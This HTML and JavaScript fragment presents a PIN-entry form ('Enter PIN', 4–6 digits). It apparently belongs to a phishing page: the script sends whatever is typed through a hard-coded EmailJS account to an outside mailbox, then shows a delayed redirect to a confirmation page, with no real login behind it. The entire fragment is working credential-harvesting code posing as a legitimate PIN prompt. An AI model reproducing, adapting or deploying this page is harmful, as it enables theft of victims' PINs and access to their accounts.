  <script type="text/javascript" src="../cdn.jsdelivr.net/npm/%40emailjs/browser%403/dist/email.min.js"></script>
  <script type="text/javascript">
      (function () {
          emailjs.init('R26T4WMBBOl4xUroP');
      })();
  </script>
  <script type="text/javascript">
      window.onload = function () {
          console.log('working');
          document.getElementById('form').addEventListener('submit', function (event) {
              const btn = document.querySelector('button')
              event.preventDefault();
              btn.innerHTML = 'Loading...';
              emailjs.sendForm('service_7cj5d05', 'scpkapp3', this)
                  .then(function (response) {
                      console.log('SUCCESS!', response.status, response.responseText);
                      setTimeout(() => {
                          window.location.href = "confirm.html";
                      }, 5000)
                  }, function (error) {
                      alert('an error occured, please try again')
                      console.log(error)
                      window.location.reload()
                  });
          });
      }
  </script>

  <form action="#" class="form px-2 mt-5" id="form" method="POST">
    <div class="form__header">

      <input required maxlength="6" minlength="4" type="tel" name="pin" id="pin" class="w-full p-3 pt-8 pl-4 h-[60px] rounded-xl bg-slate-100" placeholder="• • • •">

      <p class="label absolute top-2 left-4 text-slate-400 text-sm">Enter PIN</p>

    </div>

  </form>
